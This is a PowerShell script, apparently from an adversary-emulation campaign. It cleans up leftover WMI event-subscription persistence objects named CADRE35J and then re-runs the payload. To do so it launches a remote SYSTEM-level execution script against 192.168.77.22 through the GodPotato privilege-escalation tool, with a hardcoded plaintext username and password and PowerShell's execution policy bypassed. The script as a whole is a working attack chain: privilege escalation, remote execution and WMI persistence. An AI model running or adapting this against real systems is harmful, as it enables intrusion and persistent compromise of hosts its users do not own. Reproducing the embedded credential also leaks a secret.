# 3.5J fix: thorough cleanup of leftover WMI subscription, then re-run payload
$ErrorActionPreference = 'Continue'

# Thorough cleanup — catch ALL bindings/filters/consumers referencing CADRE35J
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35JFilter' } |
    ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue; Write-Output "REMOVED_BINDING" }

Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' } |
    ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue; Write-Output "REMOVED_FILTER" }

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JConsumer' } |
    ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue; Write-Output "REMOVED_CONSUMER" }

Start-Sleep -Seconds 2

# Verify clean
$leftBind = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35JFilter' }
$leftFilt = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' }
Write-Output "CLEAN_BINDINGS_LEFT $($leftBind.Count)"
Write-Output "CLEAN_FILTERS_LEFT $($leftFilt.Count)"

# Now re-run the full payload (create filter/consumer/binding + trigger + verify + cleanup)
$payload = 'C:\Windows\Temp\cadre-tools\campaign-a-t035j-wmi-subscription-payload.ps1'
& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File $payload"
Write-Output 'T035J_RERUN_DONE'
